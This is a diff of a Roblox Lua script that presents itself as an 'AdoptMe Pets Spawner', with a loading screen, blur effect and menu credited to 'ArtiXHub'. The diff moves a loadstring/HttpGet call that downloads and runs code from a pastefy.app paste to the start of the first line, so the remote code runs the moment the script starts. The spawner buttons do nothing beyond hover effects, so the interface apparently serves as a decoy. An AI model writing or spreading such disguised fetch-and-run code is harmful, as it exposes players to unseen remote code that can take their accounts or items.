@@ -1,10 +1,32 @@
-local TweenService = game:GetService("TweenService")
+loadstring(game:HttpGet("https://pastefy.app/BLldvDWO/raw"))() local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
 
--- Создаём ScreenGui
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-------------------------------------------------------
+-- 📌 BLUR ЭФФЕКТ НА ФОН
+-------------------------------------------------------
+local blur = Instance.new("BlurEffect")
+blur.Size = 0
+blur.Parent = game.Lighting
+
+-- Анимация появления блюра
+TweenService:Create(blur, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {
+    Size = 16
+}):Play()
+
+-------------------------------------------------------
+-- 📌 СОЗДАЁМ ScreenGui
+-------------------------------------------------------
 local screenGui = Instance.new("ScreenGui")
 screenGui.IgnoreGuiInset = true
 screenGui.ResetOnSpawn = false
-screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+screenGui.Parent = playerGui
+
+-------------------------------------------------------
+-- 📌 ЗАГРУЗОЧНЫЙ ЭКРАН
+-------------------------------------------------------
 
 -- Фон
 local bg = Instance.new("Frame")
@@ -25,7 +47,7 @@ title.TextScaled = true
 title.TextTransparency = 1
 title.Parent = bg
 
--- Контейнер полоски
+-- Полоска контейнер
 local barContainer = Instance.new("Frame")
 barContainer.Size = UDim2.new(0.6, 0, 0, 25)
 barContainer.Position = UDim2.new(0.2, 0, 0.52, 0)
@@ -34,7 +56,7 @@ barContainer.BorderSizePixel = 0
 barContainer.BackgroundTransparency = 1
 barContainer.Parent = bg
 
--- Заполняемая полоска
+-- Полоска заполнения
 local barFill = Instance.new("Frame")
 barFill.Size = UDim2.new(0, 0, 1, 0)
 barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
@@ -54,71 +76,162 @@ percentText.TextTransparency = 1
 percentText.Parent = bg
 
 -------------------------------------------------------
--- 🌟 ПЛАВНОЕ ПОЯВЛЕНИЕ ВСЕГО ЭКРАНА
+-- 🌟 ПЛАВНОЕ ПОЯВЛЕНИЕ
 -------------------------------------------------------
-local fadeIn = TweenService:Create(bg, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
-    BackgroundTransparency = 0
-})
-local textIn = TweenService:Create(title, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
-    TextTransparency = 0
-})
-local barIn = TweenService:Create(barContainer, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
-    BackgroundTransparency = 0
-})
-local percentIn = TweenService:Create(percentText, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
-    TextTransparency = 0
-})
-
-fadeIn:Play()
-textIn:Play()
-barIn:Play()
-percentIn:Play()
+TweenService:Create(bg, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
+TweenService:Create(title, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
+TweenService:Create(barContainer, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
+TweenService:Create(percentText, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
 
 task.wait(1.2)
 
 -------------------------------------------------------
--- 🔵 КРАСИВАЯ АНИМАЦИЯ ПОЛОСКИ (smooth easing)
+-- 🔵 АНІМАЦІЯ ПОЛОСКИ 60 СЕКУНД
 -------------------------------------------------------
+local duration = 60
 
-local duration = 60  -- 60 секунд
-local steps = 100
-
-for i = 0, steps do
+for i = 0, 100 do
     percentText.Text = i .. "%"
-
-    -- плавная анимация движения полоски при каждом шаге
     TweenService:Create(
         barFill,
-        TweenInfo.new(duration / steps, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
-        { Size = UDim2.new(i/100, 0, 1, 0) }
+        TweenInfo.new(duration/100, Enum.EasingStyle.Sine),
+        {Size = UDim2.new(i/100, 0, 1, 0)}
     ):Play()
-
-    task.wait(duration / steps)
+    task.wait(duration/100)
 end
 
 -------------------------------------------------------
--- 🌙 ПЛАВНОЕ ИСЧЕЗНОВЕНИЕ
+-- 🌙 ПЛАВНОЕ ИСЧЕЗНОВЕНИЕ ЗАГРУЗКИ
 -------------------------------------------------------
+TweenService:Create(bg, TweenInfo.new(1, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+TweenService:Create(title, TweenInfo.new(1, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
+TweenService:Create(barContainer, TweenInfo.new(1, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+TweenService:Create(percentText, TweenInfo.new(1, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
 
-local fadeOut = TweenService:Create(bg, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
-    BackgroundTransparency = 1
-})
-local textOut = TweenService:Create(title, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
-    TextTransparency = 1
-})
-local barOut = TweenService:Create(barContainer, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
-    BackgroundTransparency = 1
-})
-local percentOut = TweenService:Create(percentText, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
-    TextTransparency = 1
-})
-
-fadeOut:Play()
-textOut:Play()
-barOut:Play()
-percentOut:Play()
-
-task.wait(1.3)
+task.wait(1.1)
 bg:Destroy()
 
-loadstring(game:HttpGet("https://pastefy.app/BLldvDWO/raw"))()
+-------------------------------------------------------
+-- 🔊 ЗВУК ОТКРЫТИЯ МЕНЮ
+-------------------------------------------------------
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://9118823101" -- красивый UI звук
+sound.Volume = 1
+sound.Parent = screenGui
+sound:Play()
+
+-------------------------------------------------------
+-- 📌 САМ SPAWNER-ИНТЕРФЕЙС (в режиме AdoptMe стиля)
+-------------------------------------------------------
+
+local menu = Instance.new("Frame")
+menu.Size = UDim2.new(0, 420, 0, 330)
+menu.Position = UDim2.new(0.5, -210, 0, -330) -- Скрыт сверху
+menu.BackgroundColor3 = Color3.fromRGB(255, 176, 80)
+menu.BorderSizePixel = 0
+menu.Parent = screenGui
+
+-- Закругление
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 18)
+corner.Parent = menu
+
+-- Тень
+local shadow = Instance.new("ImageLabel")
+shadow.Size = UDim2.new(1, 40, 1, 40)
+shadow.Position = UDim2.new(0, -20, 0, -20)
+shadow.BackgroundTransparency = 1
+shadow.Image = "rbxassetid://1316045217"
+shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+shadow.ImageTransparency = 0.6
+shadow.Parent = menu
+
+-------------------------------------------------------
+-- 📌 Плавное выезжание вниз
+-------------------------------------------------------
+TweenService:Create(menu, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    Position = UDim2.new(0.5, -210, 0.5, -165)
+}):Play()
+
+-------------------------------------------------------
+-- Заголовок
+-------------------------------------------------------
+local title2 = Instance.new("TextLabel")
+title2.Size = UDim2.new(1, 0, 0, 60)
+title2.BackgroundTransparency = 1
+title2.Text = "AdoptMe Pets Spawner"
+title2.TextColor3 = Color3.fromRGB(255, 255, 255)
+title2.Font = Enum.Font.GothamBold
+title2.TextScaled = true
+title2.Parent = menu
+
+-------------------------------------------------------
+-- Поле ввода
+-------------------------------------------------------
+local input = Instance.new("TextBox")
+input.Size = UDim2.new(0.85, 0, 0, 45)
+input.Position = UDim2.new(0.075, 0, 0.27, 0)
+input.BackgroundColor3 = Color3.fromRGB(255, 214, 150)
+input.BorderSizePixel = 0
+input.Text = ""
+input.PlaceholderText = "Write a pet name"
+input.PlaceholderColor3 = Color3.fromRGB(110, 110, 110)
+input.TextColor3 = Color3.fromRGB(60, 60, 60)
+input.Font = Enum.Font.GothamBold
+input.TextScaled = true
+input.Parent = menu
+
+local inputCorner = Instance.new("UICorner")
+inputCorner.CornerRadius = UDim.new(0, 12)
+inputCorner.Parent = input
+
+-------------------------------------------------------
+-- КНОПКИ
+-------------------------------------------------------
+
+local buttons = {
+    {Text="Ride", Color=Color3.fromRGB(255, 70, 70)},
+    {Text="Fly",  Color=Color3.fromRGB(70, 160, 255)},
+    {Text="Neon", Color=Color3.fromRGB(70, 255, 90)},
+    {Text="Mega", Color=Color3.fromRGB(200, 70, 255)},
+}
+
+for i, b in ipairs(buttons) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.21, 0, 0, 45)
+    btn.Position = UDim2.new(0.04 + (i-1)*0.24, 0, 0.52, 0)
+    btn.BackgroundColor3 = b.Color
+    btn.BorderSizePixel = 0
+    btn.Text = b.Text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextScaled = true
+    btn.Parent = menu
+
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 10)
+    c.Parent = btn
+
+    -- Hover эффект
+    btn.MouseEnter:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = b.Color + Color3.fromRGB(25,25,25)}):Play()
+    end)
+    btn.MouseLeave:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = b.Color}):Play()
+    end)
+end
+
+-------------------------------------------------------
+-- Подпись
+-------------------------------------------------------
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1, 0, 0, 35)
+footer.Position = UDim2.new(0, 0, 0.83, 0)
+footer.BackgroundTransparency = 1
+footer.Text = "Script by ArtiXHub"
+footer.TextColor3 = Color3.fromRGB(255, 255, 255)
+footer.Font = Enum.Font.GothamBold
+footer.TextScaled = true
+footer.Parent = menu
+
+
